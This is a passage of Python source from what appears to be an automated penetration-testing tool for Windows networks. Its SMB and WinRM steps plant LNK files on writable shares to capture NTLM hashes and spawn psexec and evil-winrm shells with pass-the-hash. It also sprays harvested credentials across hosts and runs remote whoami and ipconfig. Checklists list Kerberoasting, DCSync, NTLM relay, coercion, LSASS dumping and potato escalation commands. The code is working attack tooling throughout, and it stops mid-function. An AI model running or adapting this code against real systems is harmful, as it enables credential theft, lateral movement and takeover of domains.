        auth = _smb_auth_nxc(dom, user, pw) if not is_hash else \
            (["-u", user, "-H", pw] + (["-d", dom] if dom else []))
        _, out = _smb_run([nxc, "smb", ip, *auth, "-M", "slinky",
                           "-o", f"SERVER={lhost}", f"NAME={_SMBWRITABLE_NAME}", "CLEANUP=False"], 90)
        if re.search(r"\b445\b", out):
            reached = True
        if not re.search(r"\b445\b.*\[\+\]", out):
            continue
        for ln in out.splitlines():               # collect shares where the LNK was written
            if re.search(r"creat|written|\.lnk", ln, re.I) and not re.search(r"fail|error|\[-\]", ln, re.I):
                ms = re.search(r"on (?:the )?(\S+) share|\bshare[:\s]+(\S+)|\\\\[^\\]+\\([^\\\s]+)", ln, re.I)
                share = next((g for g in (ms.groups() if ms else []) if g), None)
                if share and share not in planted:
                    planted.append(share)
        if planted or re.search(r"\bslinky\b.*\[\+\]", out, re.I):
            used = label
            break
    if not reached:
        raise RuntimeError(f"{ip}:{port} did not answer (unreachable / not SMB?)")

    lines = [f"[*] Target: {ip}   LISTENER: {lhost}   Auth: {used or 'none accepted'}"]
    for share in planted:
        lines.append(f"✗ PLANT {share}")
    if used and not planted:
        lines.append(f"✗ PLANT (writable share(s) — {_SMBWRITABLE_NAME}.lnk)")
    if used:
        lines.append(f"· start a listener (relay r6 / poison r5) — Explorer browsers coerce to {lhost}")
        lines.append(f"· CLEANUP: nxc smb {ip} -u <user> -p|-H <secret> -M slinky "
                     f"-o SERVER={lhost} NAME={_SMBWRITABLE_NAME} CLEANUP=True")
    else:
        lines.append("· no writable share / no session accepted — need creds "
                     "(smb-loot r3) or an anonymous writable share")
    return f"Writable-share hash capture — {ip}  (plants {_SMBWRITABLE_NAME}.lnk)\n\n" + "\n".join(lines)


# ── SMB step 13: foothold — spawn an interactive admin session ─────────────────
def _open_shell_terminal(cmd: str) -> "str | None":
    """Open a shell command in a new terminal window/tab (for an interactive remote session).
    Returns the emulator used, or None when headless so the caller can print the command."""
    term = next(((shutil.which(x), flag) for x, flag in _TERM_EMULATORS if shutil.which(x)),
                (None, None))
    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")) or not term[0]:
        return None
    binary, flag = term
    inner = f"{cmd}; exec ${{SHELL:-/bin/bash}}"
    try:
        subprocess.Popen([binary] + flag + ["sh", "-c", inner],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        return binary
    except Exception:                                         # noqa: BLE001
        return None


def _smb_cred_domain(user: str, secret: str) -> str:
    """Recover the AD domain for a cred from smb-creds (spray drops it in the admin note)."""
    for row in fetch_hosts():
        for sid, output in fetch_scripts(row[0], 445, "tcp"):
            if sid != "smb-creds":
                continue
            for m in re.finditer(r"! (\S+?):(\S*) @ .+?\[([^\]]+)\]", output or ""):
                if m.group(1).lower() == user.lower() and m.group(2) == secret:
                    dom = m.group(3)
                    if dom and not _looks_ip(dom):
                        return dom
    return ""


def _smb_foothold_methods(host: str) -> list:
    """Every installed exec method the operator can pick, psexec first (the default). evil-winrm
    is always offered when installed — the menu flags whether WinRM was actually seen — so the
    operator can choose any way to spawn, not only the auto-detected one. (name, binary)."""
    order = []
    for name, binexe in (("psexec", "impacket-psexec"), ("wmiexec", "impacket-wmiexec"),
                         ("smbexec", "impacket-smbexec"), ("atexec", "impacket-atexec")):
        if shutil.which(binexe):
            order.append((name, binexe))
    if shutil.which("evil-winrm"):
        order.append(("evil-winrm", "evil-winrm"))
    return order


def _smb_foothold_cmd(method: str, binexe: str, host: str, dom: str, user: str,
                      secret: str, is_hash: bool) -> list:
    """Build the interactive-session command for a method (pass-the-hash when secret is a hash)."""
    if method == "evil-winrm":
        return ["evil-winrm", "-i", host, "-u", user] + \
            (["-H", secret] if is_hash else ["-p", secret])
    prefix = f"{dom}/{user}" if dom else user
    if is_hash:
        return [binexe, f"{prefix}@{host}", "-hashes", f":{secret}"]
    return [binexe, f"{prefix}:{secret}@{host}"]


def _tool_smb_foothold(ip: str, port: int, proto: str) -> str:
    """SMB step 13 tool (INTERACTIVE): spawn an interactive admin session on a host smb-spray/
    smb-exec confirmed local admin. The operator picks the target and the exec method — psexec
    (full SYSTEM shell), wmiexec / smbexec / atexec, or evil-winrm when WinRM is open (psexec is
    the default). Pass-the-hash when the cred is an NT hash. Opens the session in a new terminal
    window; headless, it prints the exact command. Authorised targets only."""
    admins = _gather_smb_admin()
    if not admins:
        print(f"\n{YELLOW}no confirmed admin creds{RESET} — run {BOLD}smb-spray (r9){RESET} / "
              f"{BOLD}smb-exec (r10){RESET} first, then retry.")
        return "smb-foothold: no admin creds (run smb-spray r9 / smb-exec r10)"

    if len(admins) == 1:                          # one target → no need to ask
        host, user, secret = admins[0]
    else:
        print(f"\n{BOLD}admin targets{RESET}")
        for i, (h, u, _s) in enumerate(admins, 1):
            print(f"  {BOLD}{i}{RESET}  {u} @ {h}")
        v = _ask("pick target [1-N, blank = cancel]:")
        if not v or not v.isdigit() or not 1 <= int(v) <= len(admins):
            print(f"{DIM}cancelled{RESET}")
            return "smb-foothold: cancelled"
        host, user, secret = admins[int(v) - 1]

    methods = _smb_foothold_methods(host)
    if not methods:
        print(f"\n{RED}✗ no exec tooling{RESET} — install impacket (psexec/wmiexec) or evil-winrm.")
        return "smb-foothold: no exec tooling available"
    if len(methods) == 1:
        method, binexe = methods[0]
    else:
        winrm = any(p in (5985, 5986) for p, _pr, _st in fetch_ports(host))
        print(f"\n{BOLD}exec method / tool{RESET} {DIM}(blank = 1 psexec){RESET}")
        for i, (nm, _b) in enumerate(methods, 1):
            hint = {"psexec": "full SYSTEM shell", "wmiexec": "semi-interactive, cleaner",
                    "smbexec": "service-based", "atexec": "scheduled task"}.get(nm, "")
            if nm == "evil-winrm":
                hint = "WinRM ✓" if winrm else "needs WinRM 5985"
            print(f"  {BOLD}{i}{RESET}  {nm:<11}{DIM}{hint}{RESET}")
        v = _ask("pick method [1-N, blank = 1]:")
        method, binexe = methods[int(v) - 1] if (v and v.isdigit() and 1 <= int(v) <= len(methods)) \
            else methods[0]

    is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
    dom = _smb_cred_domain(user, secret)
    cmd = _smb_foothold_cmd(method, binexe, host, dom, user, secret, is_hash)
    cmd_str = shlex.join(cmd)
    who = f"{dom}\\{user}" if dom else user

    print(f"\n{GREEN}✓ target:{RESET} {who}@{host}  "
          f"{DIM}· method {BOLD}{method}{RESET}{DIM}{' · pass-the-hash' if is_hash else ''}{RESET}")
    term = _open_shell_terminal(cmd_str)
    if term:
        print(f"{GREEN}▶ spawned {method} in a new {term} window{RESET} {DIM}→ {who}@{host}{RESET}")
        tail = ""
    else:
        print(f"{YELLOW}headless{RESET} — run this yourself:\n  {BOLD}{cmd_str}{RESET}")
        tail = " (headless — command shown)"
    return f"smb-foothold: {method} shell → {who}@{host}{tail}"


# ── SMB step 14: manual steps (read-only reference, this host's findings substituted) ──
def _tool_smb_next(ip: str, port: int, proto: str) -> str:
    """SMB step-14 tool: NOT a scan — a read-only checklist of manual AD/SMB escalations for
    when the automated steps came up short, with this host's own findings substituted in
    (SMB-phase CVEs, enumerated users & domain → ready commands, harvested creds, and
    unconfirmed ⚠ hits listed for manual verification). Pure DB synthesis; no network."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    enum = by_sid.get("smb-enum", "")

    md = re.search(r"Domain:\s*(\S+)", enum)
    dom = md.group(1) if md and not _looks_ip(md.group(1)) else None
    dc = dom or "<domain>"
    users = []
    for m in re.finditer(r"\d+:\s*\S+\\([^\s(]+)\s*\(SidTypeUser\)", enum):
        users.append(m.group(1))
    for m in re.finditer(r"^\s*\S+\\([A-Za-z0-9._$-]+)\s*$", enum, re.M):
        users.append(m.group(1))
    users = [u for u in dict.fromkeys(users) if u.lower() != "guest"][:12]
    ncreds, nadmin = len(_gather_all_smb_creds()), len(_gather_smb_admin())

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            s = ln.strip()
            if s.startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {s}")
    warns = warns[:14]

    ucred = "-u <user> -p <pass>" if ncreds else "-u '' -p ''"
    L = [f"SMB {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}",
         f"{DIM}domain: {dc}  ·  harvested creds: {ncreds}  ·  admin footholds: {nadmin}{RESET}"]

    L.append(f"{DIM}▶ shell? → Privilege Escalation phase, step 1 (spawn-shell) — one place, all services{RESET}")
    L.append(f"\n{BOLD}A. Deeper enumeration{RESET}")
    L.append(f"  {DIM}enum4linux-ng -A {ip}   ·   nxc smb {ip} -u '' -p '' --rid-brute 20000{RESET}")
    L.append(f"  {DIM}LDAP: nxc ldap {dc} {ucred} --bloodhound -c all -ns {ip}   ·   "
             f"ldapdomaindump / windapsearch{RESET}")

    L.append(f"\n{BOLD}B. Interactive & heavier tooling{RESET}")
    L.append(f"  {DIM}BloodHound: bloodhound-python -d {dc} {ucred} -c All -ns {ip}  → ACL / attack paths{RESET}")
    L.append(f"  {DIM}ADCS: certipy find {ucred} -dc-ip {ip} -vulnerable   (ESC1-8){RESET}")
    L.append(f"  {DIM}Coercer scan; mitm6 -d {dc} + ntlmrelayx (IPv6 DNS takeover){RESET}")

    L.append(f"\n{BOLD}C. CVEs surfaced in the SMB phase{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
        L.append(f"  {DIM}none surfaced yet — re-run smb-vuln (r2) / smb-dccve (r8){RESET}")

    L.append(f"\n{BOLD}D. Credentials & lateral movement{RESET}")
    if users:
        L.append(f"  {CYAN}users:{RESET} {', '.join(users)}")
    ulist = "users.txt" if users else "<users.txt>"
    L.append(f"  {DIM}Kerberoast: nxc ldap {dc} {ucred} --kerberoasting kerb.txt   "
             f"(GetUserSPNs.py){RESET}")
    L.append(f"  {DIM}AS-REP roast: nxc ldap {dc} -u {ulist} -p '' --asreproast asrep.txt   "
             f"(GetNPUsers.py){RESET}")
    L.append(f"  {DIM}spray (1 pw / account, mind lockout): nxc smb {ip} -u {ulist} -p "
             f"'<Season2024!>' --continue-on-success{RESET}")
    L.append(f"  {DIM}DCSync (if DA): impacket-secretsdump '{dc}/<user>:<pass>@{ip}' -just-dc{RESET}")

    L.append(f"\n{BOLD}E. Coercion & relay deep-dive{RESET}")
    L.append(f"  {DIM}ntlmrelayx -t ldap://{ip} --escalate-user <you>   ·   -t <host> --socks (keep sessions){RESET}")
    L.append(f"  {DIM}coerce toward your listener: PetitPotam / DFSCoerce / PrinterBug / Coercer{RESET}")

    L.append(f"\n{BOLD}F. AD classes to test manually{RESET}")
    L.append(f"  {DIM}delegation (unconstrained / constrained / RBCD) · ADCS ESC1-8 · ACL abuse "
             f"(BloodHound) · GPO abuse · MachineAccountQuota{RESET}")

    L.append(f"\n{BOLD}G. Verify unconfirmed findings from this phase{RESET}")
    if warns:
        for w in warns:
            L.append(f"  {w}")
    else:
        L.append(f"  {DIM}none flagged — nothing sat on the fence{RESET}")

    L.append(f"\n{BOLD}H. Re-run & housekeeping{RESET}")
    L.append(f"  {DIM}after a dump (r11), re-spray the new NT hashes (r9) to lateral further{RESET}")
    if by_sid.get("smb-writable"):
        L.append(f"  {DIM}remove any planted LNK: smb-writable CLEANUP (see r12 output){RESET}")
    L.append(f"  {DIM}add {dc} / the DC to /etc/hosts; sync the clock for Kerberos "
             f"(ntpdate {ip} / faketime){RESET}")
    return "\n".join(L)


# ── WinRM step 1: confirm the WS-Management transport (unauth, stdlib probe) ────
_WINRM_PORTS = ((5985, False), (5986, True))     # (port, tls) — HTTP and HTTPS WS-Man


def _winrm_auth_schemes(headers: list) -> list:
    """Auth schemes offered on WWW-Authenticate (Negotiate/Kerberos/NTLM/Basic/CredSSP)."""
    out = []
    for h in headers:
        for s in re.findall(r"\b(Negotiate|Kerberos|NTLM|Basic|CredSSP|Digest)\b", h or ""):
            if s not in out:
                out.append(s)
    return out


def _winrm_probe(ip: str, port: int, tls: bool) -> dict:
    """Unauthenticated probe of /wsman: is WinRM up, its Server banner and offered auth."""
    import http.client
    import ssl
    info = {"port": port, "tls": tls, "up": False, "server": "", "auth": []}
    try:
        if tls:
            conn = http.client.HTTPSConnection(ip, port, timeout=8,
                                               context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(ip, port, timeout=8)
        conn.request("POST", "/wsman", body="",
                     headers={"Content-Type": "application/soap+xml;charset=UTF-8",
                              "Content-Length": "0"})
        r = conn.getresponse()
        info["server"] = r.getheader("Server", "") or ""
        info["auth"] = _winrm_auth_schemes([v for k, v in r.getheaders()
                                            if k.lower() == "www-authenticate"])
        r.read()
        conn.close()
        info["up"] = ("microsoft-httpapi" in info["server"].lower()) or r.status in (401, 200, 405)
    except Exception:                                        # noqa: BLE001 — down/filtered
        info["up"] = False
    return info


def _tool_winrm_enum(ip: str, port: int, proto: str) -> str:
    """WinRM step 1 tool: confirm the WS-Management transport unauthenticated — probe /wsman on
    5985 (HTTP) and 5986 (HTTPS), read the Microsoft-HTTPAPI banner and the offered auth schemes
    (Negotiate/Kerberos/NTLM/Basic/CredSSP), and (when netexec is present) enrich with the host
    OS / name / domain. Stdlib core: no creds tried, no lockout. A host with neither port up
    raises so the step won't green on a non-result. Authorised targets only."""
    probes = [_winrm_probe(ip, p, tls) for p, tls in _WINRM_PORTS]
    up = [x for x in probes if x["up"]]
    if not up:
        raise RuntimeError(f"{ip} — no WinRM on 5985/5986 (service down / filtered?)")

    server = next((x["server"] for x in up if x["server"]), "")
    auth = []
    for x in up:
        for s in x["auth"]:
            if s not in auth:
                auth.append(s)
    basic_http = any("Basic" in x["auth"] and not x["tls"] for x in up)

    trans = "   ".join(
        f"{'HTTPS' if tls else 'HTTP'} {p} "
        f"{'✓' if any(x['port'] == p and x['up'] for x in probes) else '✗'}"
        for p, tls in _WINRM_PORTS)
    lines = [f"[*] Transport: {trans}"]
    if server:
        lines.append(f"[*] Server: {server}")
    if auth:
        lines.append(f"[*] Auth: {', '.join(auth)}")

    nxc = shutil.which("netexec") or shutil.which("nxc")     # enrichment: OS / name / domain
    if nxc:
        _, out = _smb_run([nxc, "winrm", ip], 40)
        facts = {}
        mb = re.search(r"\[\*\]\s*(.+)", out)
        if mb:
            facts["os"] = re.sub(r"\s*\(name:.*$", "", mb.group(1)).strip()
        for key, rx in (("name", r"\(name:([^)]*)\)"), ("domain", r"\(domain:([^)]*)\)")):
            mm = re.search(rx, out)
            if mm:
                facts[key] = mm.group(1).strip()
        bits = "   ".join(x for x in (
            f"Host: {facts['name']}" if facts.get("name") else "",
            f"OS: {facts['os']}" if facts.get("os") else "",
            f"Domain: {facts['domain']}" if facts.get("domain") else "") if x)
        if bits:
            lines.append(f"[*] {bits}   (netexec)")

    if basic_http:
        lines.append("⚠ Basic auth over HTTP — credentials are sniffable")
    lines.append("· evil-winrm candidate — validate/spray creds next (step 2)"
                 + ("  ·  use -S for HTTPS" if any(x["tls"] for x in up) else ""))
    return f"WinRM enumeration — {ip}\n\n" + "\n".join(lines)


# ── WinRM step 2: validate harvested creds/hashes against WinRM (reuse/lateral) ──
_WINRMSPRAY_DEADLINE = 240       # s — overall cap


def _winrm_hosts() -> list:
    """Every DB host with WinRM open (5985/5986) — the validation surface."""
    hosts = []
    for row in fetch_hosts():
        hip = row[0]
        if any(p in (5985, 5986) and pr == "tcp" for p, pr, _st in fetch_ports(hip)):
            hosts.append(hip)
    return hosts


def _tool_winrm_spray(ip: str, port: int, proto: str) -> str:
    """WinRM step 2 tool: validate every harvested credential / NT hash against WinRM on all DB
    hosts — a WinRM ACL (Remote Management Users / admin) is separate from SMB, so this confirms
    who can actually get a shell here. Each pair is the account's own real secret, tried once per
    host (no guessing, no lockout). netexec reports where each cred is valid and where it yields
    a shell (Pwn3d!). Shell-capable creds are saved to smb-creds (feeds the WinRM shell step).
    Pass-the-hash for NT hashes. No root. Raises without harvested creds or WinRM hosts."""
    import time
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to spray WinRM")
    hosts = _winrm_hosts()
    if not hosts:
        raise RuntimeError("no WinRM hosts recorded — run winrm-enum (r1) / port enumeration first")
    creds = _gather_all_smb_creds()[:_SMBSPRAY_MAX_CREDS]
    if not creds:
        raise RuntimeError("no harvested creds to spray — run the SMB phase (loot/gpp/dump) first")

    deadline = time.time() + _WINRMSPRAY_DEADLINE
    valids, shells = [], []                       # (host, who, secret)
    for dom, user, secret in creds:
        if time.time() > deadline:
            break
        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
        if dom:
            auth += ["-d", dom]
        _, out = _smb_run([nxc, "winrm", *hosts, *auth, "--continue-on-success"], 120)
        who = f"{dom}\\{user}" if dom else user
        for ln in out.splitlines():
            m = re.match(r"WINRM\s+(\S+)\s+\d+\s+\S+\s+\[\+\]", ln)
            if not m:
                continue
            (shells if "(Pwn3d!)" in ln else valids).append((m.group(1), who, secret))

    if shells:                                    # persist shell-capable creds (canonical store: 445)
        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
        for host, who, secret in shells:
            line = f"! {who.split(chr(92))[-1]}:{secret} @ winrm on {host} [{host}]"
            blocks.setdefault(host, [])
            if line not in blocks[host]:
                blocks[host].append(line)
        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)

    lines = [f"[*] {len(creds)} cred(s) × {len(hosts)} WinRM host(s)"]
    for host, who, _s in dict.fromkeys((a[0], a[1], None) for a in shells):
        lines.append(f"✗ SHELL {who} @ {host}  (Pwn3d!)")
    for host, who, _s in dict.fromkeys((v[0], v[1], None) for v in valids):
        lines.append(f"✓ VALID {who} @ {host}")
    if not shells and not valids:
        lines.append("· no WinRM access with the harvested creds")
    return f"WinRM credential spray — {len(creds)}×{len(hosts)}  (reuse / lateral)\n\n" + "\n".join(lines)


# ── WinRM step 3: interactive shell (evil-winrm) over a WinRM-capable cred ──────
def _gather_winrm_creds() -> list:
    """(host, user, secret) creds winrm-spray proved can get a WinRM shell (Pwn3d!)."""
    out, seen = [], set()
    for row in fetch_hosts():
        for sid, output in fetch_scripts(row[0], 445, "tcp"):
            if sid != "smb-creds":
                continue
            for m in re.finditer(r"! (\S+?):(\S*) @ winrm on (\S+)", output or ""):
                secret = "" if m.group(2) == "<blank>" else m.group(2)
                key = (m.group(3), m.group(1).lower(), secret)
                if key not in seen:
                    seen.add(key)
                    out.append((m.group(3), m.group(1), secret))
    return out


def _tool_winrm_shell(ip: str, port: int, proto: str) -> str:
    """WinRM step 3 tool (INTERACTIVE): spawn an evil-winrm session over a cred winrm-spray
    proved can get a shell (Pwn3d!). The operator picks the target when there is more than one;
    HTTPS (-S) is added automatically when 5986 is open. Pass-the-hash (-H) when the cred is an
    NT hash. Opens the session in a new terminal window; headless, it prints the exact command.
    Authorised targets only."""
    if not shutil.which("evil-winrm"):
        print(f"\n{RED}✗ evil-winrm not installed{RESET} — install it to spawn a WinRM shell.")
        return "winrm-shell: evil-winrm not installed"
    creds = _gather_winrm_creds()
    if not creds:
        print(f"\n{YELLOW}no WinRM-capable creds{RESET} — run {BOLD}winrm-spray (r2){RESET} first "
              f"(it flags which creds get a shell), then retry.")
        return "winrm-shell: no WinRM creds (run winrm-spray r2)"

    if len(creds) == 1:
        host, user, secret = creds[0]
    else:
        print(f"\n{BOLD}WinRM targets{RESET}")
        for i, (h, u, _s) in enumerate(creds, 1):
            print(f"  {BOLD}{i}{RESET}  {u} @ {h}")
        v = _ask("pick target [1-N, blank = cancel]:")
        if not v or not v.isdigit() or not 1 <= int(v) <= len(creds):
            print(f"{DIM}cancelled{RESET}")
            return "winrm-shell: cancelled"
        host, user, secret = creds[int(v) - 1]

    is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
    ssl_on = any(p == 5986 and pr == "tcp" for p, pr, _st in fetch_ports(host))
    cmd = ["evil-winrm", "-i", host, "-u", user] + (["-H", secret] if is_hash else ["-p", secret])
    if ssl_on:
        cmd.append("-S")
    cmd_str = shlex.join(cmd)

    print(f"\n{GREEN}✓ target:{RESET} {user}@{host}  "
          f"{DIM}· evil-winrm{' -S (HTTPS)' if ssl_on else ''}"
          f"{' · pass-the-hash' if is_hash else ''}{RESET}")
    term = _open_shell_terminal(cmd_str)
    if term:
        print(f"{GREEN}▶ spawned evil-winrm in a new {term} window{RESET} {DIM}→ {user}@{host}{RESET}")
        tail = ""
    else:
        print(f"{YELLOW}headless{RESET} — run this yourself:\n  {BOLD}{cmd_str}{RESET}")
        tail = " (headless — command shown)"
    return f"winrm-shell: evil-winrm shell → {user}@{host}{tail}"


# ── WinRM step 4: who can log in — Remote Management Users / Administrators ─────
def _tool_winrm_access(ip: str, port: int, proto: str) -> str:
    """WinRM step 4 tool: enumerate who can actually use WinRM — the members of the local
    'Remote Management Users' and 'Administrators' groups on this host — using any harvested
    valid cred (netexec --local-group over SMB). Accounts you already hold a cred for are
    flagged, so you know which to target/reuse. Read-only; needs a valid cred and SMB (445)
    reachable. No root. Raises without a working cred. Authorised targets only."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it to enumerate WinRM access")
    creds = _gather_all_smb_creds()
    if not creds:
        raise RuntimeError("no valid creds — run the SMB phase / winrm-spray (r2) first")
    have = {u.lower() for _d, u, _s in creds}

    lines, members, used = [], [], None
    for dom, user, secret in creds:
        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
        if dom:
            auth += ["-d", dom]
        _, probe = _smb_run([nxc, "smb", ip, *auth], 40)
        if not re.search(r"\b445\b.*\[\+\]", probe):
            continue
        used = f"{dom}\\{user}" if dom else user
        for group in ("Remote Management Users", "Administrators"):
            _, out = _smb_run([nxc, "smb", ip, *auth, "--local-group", group], 60)
            gm = []
            for ln in _nxc_body(out).splitlines():
                mm = re.search(r"([A-Za-z0-9._-]+\\[A-Za-z0-9._$ -]+?)\s*$", ln.strip())
                if mm and "\\" in mm.group(1):
                    gm.append(mm.group(1).strip())
            gm = list(dict.fromkeys(gm))
            if gm:
                lines.append(f"[{group}]")
                for who in gm:
                    tag = "  (have cred)" if who.split("\\")[-1].lower() in have else ""
                    lines.append(f"✗ WINRM-USER {who}{tag}")
                    members.append(who)
        break
    if used is None:
        raise RuntimeError(f"{ip} — no harvested cred authenticated over SMB (is 445 open?)")

    head = [f"[*] enumerated via {used} (SMB 445 on {ip})"]
    if not members:
        head.append("· no members returned (groups empty / not resolvable with this cred)")
    return f"WinRM access — {ip}\n\n" + "\n".join(head + lines)


# ── WinRM step 5: post-access recon over the shell (privesc + pivot surface) ────
_HOT_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
              "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
              "SeLoadDriverPrivilege", "SeManageVolumePrivilege", "SeTcbPrivilege"}


def _tool_winrm_recon(ip: str, port: int, proto: str) -> str:
    """WinRM step 5 tool: quick, non-interactive post-access recon over the WinRM channel using
    a shell-capable cred (from winrm-spray) — runs read-only commands via netexec -x (whoami
    /priv, ipconfig) to surface a privesc path (SeImpersonate → PrintSpoofer/potato → SYSTEM)
    and the pivot surface (other subnets to reuse creds against). Deeper enumeration / uploading
    tooling stays in the interactive shell (step 3/6). No root. Raises without a WinRM cred."""
    nxc = shutil.which("netexec") or shutil.which("nxc")
    if not nxc:
        raise RuntimeError("netexec not found — install it for post-access recon")
    creds = [c for c in _gather_winrm_creds() if c[0] == ip] or _gather_winrm_creds()
    if not creds:
        raise RuntimeError("no WinRM-capable cred — run winrm-spray (r2) first")
    host, user, secret = creds[0]
    is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
    auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])

    _, o1 = _smb_run([nxc, "winrm", host, *auth, "-x", "whoami & whoami /priv"], 90)
    if not re.search(r"\b5985\b.*\[\+\]|\b5986\b.*\[\+\]|\[\+\]", o1):
        raise RuntimeError(f"{host} — WinRM cred did not authenticate (rotated?)")
    _, o2 = _smb_run([nxc, "winrm", host, *auth, "-x", "ipconfig"], 90)
    b1, b2 = _nxc_body(o1), _nxc_body(o2)

    ctx = next((ln.strip() for ln in b1.splitlines()
                if re.match(r"^\S+\\\S+$", ln.strip()) or "system" in ln.lower()), "")
    privs = []
    for ln in b1.splitlines():
        mm = re.search(r"(Se\w+Privilege)", ln)
        if mm and "Enabled" in ln and mm.group(1) not in privs:
            privs.append(mm.group(1))
    subnets = list(dict.fromkeys(
        f"{a}.0/24" for a in re.findall(r"(\d+\.\d+\.\d+)\.\d+", b2)
        if not a.startswith(("127.", "169.254"))))

    hot = [p for p in privs if p in _HOT_PRIVS]
    lines = [f"[*] Context: {ctx or user}   (WinRM-capable cred)"]
    for p in privs:
        lines.append(f"✗ PRIV {p}" + ("  ⚑" if p in _HOT_PRIVS else ""))
    if subnets:
        lines.append(f"[*] Networks: {', '.join(subnets)}   (pivot surface)")
    if hot:
        lines.append(f"· {hot[0]} → PrintSpoofer / potato → SYSTEM")
    if len(subnets) > 1:
        lines.append("· pivot: reuse creds/hash across the other subnet(s) — re-run spray there")
    return f"WinRM post-access recon — {host}\n\n" + "\n".join(lines)


# ── WinRM step 6: manual steps (read-only reference, this host's findings substituted) ──
def _tool_winrm_next(ip: str, port: int, proto: str) -> str:
    """WinRM step-6 tool: NOT a scan — a read-only checklist of manual WinRM/AD escalations for
    when the automated steps came up short, with this host's own findings substituted in (the
    privesc path from winrm-recon, pivot subnets, who can WinRM, the domain, phase CVEs, and
    unconfirmed ⚠ hits to verify). Pure DB synthesis; no network."""
    scripts = fetch_scripts(ip, port, proto)
    by_sid = {}
    for sid, out in scripts:
        by_sid.setdefault(sid, out or "")
    recon, access, enum = by_sid.get("winrm-recon", ""), by_sid.get("winrm-access", ""), by_sid.get("winrm-enum", "")

    md = re.search(r"Domain:\s*(\S+)", enum)
    dom = md.group(1) if md and not _looks_ip(md.group(1)) else None
    dc = dom or "<domain>"
    privs = re.findall(r"^✗ PRIV (\S+)", recon, re.M)
    hot = [p for p in privs if p in _HOT_PRIVS]
    subnets = (re.search(r"Networks:\s*(.+?)\s{2,}", recon) or re.search(r"Networks:\s*(.+)", recon))
    subnets = subnets.group(1).strip() if subnets else ""
    who = [w.replace("  (have cred)", "").strip()
           for w in re.findall(r"^✗ WINRM-USER (.+)$", access, re.M)]
    nwinrm = len(_gather_winrm_creds())

    kev = _load_kev()
    found = set()
    for (p, pr, _sc, _st, cv, _rk, _sm) in fetch_vulns(ip):
        if p == port and pr == proto and cv:
            found |= {c.strip() for c in cv.split(",") if c.strip()}
    for _sid, out in scripts:
        found |= set(re.findall(r"CVE-\d{4}-\d{3,7}", out or ""))
    found = sorted(found, key=_cve_sort_key)

    warns = []
    for sid, out in scripts:
        for ln in (out or "").splitlines():
            s = ln.strip()
            if s.startswith("⚠"):
                warns.append(f"{DIM}[{sid}]{RESET} {s}")
    warns = warns[:14]

    L = [f"WinRM {ip} — manual steps {DIM}(reference only — nothing is scanned here){RESET}",
         f"{DIM}domain: {dc}  ·  WinRM-capable creds: {nwinrm}"
         + (f"  ·  pivot: {subnets}" if subnets else "") + RESET]

    L.append(f"{DIM}▶ no shell yet? → Privilege Escalation phase, step 1 (spawn-shell){RESET}")
    L.append(f"\n{BOLD}A. Privilege escalation (run in the shell){RESET}")
    if hot:
        if any(p in ("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege") for p in hot):
            L.append(f"  {CYAN}{'/'.join(hot)}{RESET} → {DIM}PrintSpoofer.exe -i -c cmd  ·  "
                     f"GodPotato -cmd 'cmd /c whoami'  ·  JuicyPotatoNG → SYSTEM{RESET}")
        if any(p in ("SeBackupPrivilege", "SeRestorePrivilege") for p in hot):
            L.append(f"  {CYAN}SeBackup/SeRestore{RESET} → {DIM}reg save HKLM\\SAM & SYSTEM → "
                     f"secretsdump  ·  or shadow-copy the NTDS.dit on a DC{RESET}")
        if "SeDebugPrivilege" in hot:
            L.append(f"  {CYAN}SeDebug{RESET} → {DIM}dump LSASS (mimikatz / nanodump / procdump){RESET}")
    L.append(f"  {DIM}winPEAS.exe / Seatbelt.exe · unquoted service paths · AlwaysInstallElevated · "
             f"scheduled tasks · writable service binaries{RESET}")

    L.append(f"\n{BOLD}B. Lateral movement & pivot{RESET}")
    if subnets and "," in subnets:
        L.append(f"  {CYAN}other subnet(s):{RESET} {subnets} {DIM}→ re-run spray/PtH there{RESET}")
    L.append(f"  {DIM}tunnel through this host: ligolo-ng / chisel / proxychains, then nxc the inner net{RESET}")
    L.append(f"  {DIM}reuse creds & NT hashes (PtH) across SMB/WinRM/MSSQL/RDP on the domain{RESET}")

    L.append(f"\n{BOLD}C. CVEs surfaced in this phase{RESET}")
    if found:
        for c in found:
            ktag = f"  {RED}KEV{RESET}" if c in kev else ""
            L.append(f"  {c}{ktag}  {DIM}https://nvd.nist.gov/vuln/detail/{c}{RESET}")
    else:
